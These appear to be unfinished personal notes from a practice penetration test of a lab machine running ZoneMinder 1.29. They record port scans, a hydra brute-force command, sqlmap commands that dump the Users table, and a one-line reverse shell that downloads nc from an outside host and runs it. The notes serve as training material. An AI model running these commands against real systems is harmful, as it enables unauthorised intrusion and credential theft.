Given IP target 192.168.236.52

Speedrun port scan for opens
	rustscan 192.168.236.52 
		PORT     STATE SERVICE    REASON
		21/tcp   open  ftp        syn-ack
		22/tcp   open  ssh        syn-ack
		80/tcp   open  http       syn-ack
		3305/tcp open  odette-ftp syn-ack
		8080/tcp open  http-proxy syn-ack

nmap -sC -sV -T5 -p 21,22,80,3305,8080 192.168.236.52 -oN services.txt
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     vsftpd 3.0.3
	22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
	|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
	|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
	80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Pebbles
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-favicon: Apache Tomcat
	|_http-open-proxy: Proxy might be redirecting requests
	|_http-title: Tomcat
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


dirbuster http://192.168.236.52
	login form on http://192.168.236.52/index.php
		![[Pasted image 20231102090354.png]]
	prep hydra command
		hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.236.52  http-post-form "/index.php:username=^USER^&password=^PASS^:Incorrect username or password"
			:Data fields:"login fail message"
			Too many concurrent actions causes false positives
	Found zm directory
		http://192.168.236.52/zm/index.php
		![[Pasted image 20231102092635.png]]
		
dirbuster http://192.168.236.52:8080
dirbuster http://192.168.236.52:3305
	![[Pasted image 20231102091749.png]]

Now searchsploit on the ZoneMinder software ZoneMinder, v1.29.0
	searchsploit ZoneMinder                                                                                                          
		 Exploit Title                                                                                               |  Path
		------------------------------------------------------------------------------------------------------------- ---------------------------------
		ZoneMinder 1.24.3 - Remote File Inclusion                                                                    | php/webapps/17593.txt
		**Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery  | php/webapps/41239.txt**

The exploit page has examples of SQLi

I want tables and databases

sqlmap with the payload from exploitdb got me an os-shell

![[Pasted image 20231102101542.png]]

Now to connect a reverse nc to get a proper shell
	wget "http://192.168.45.198/nc" -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash 192.168.45.198 4444


Trying to manually log in

sqlmap http://192.168.236.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm -T Users -C Username,Password --dump --threads 5

![[Pasted image 20231102102857.png]]

So basically admin:admin

Now where to log in?



os-shell returns no data so it's likely broken

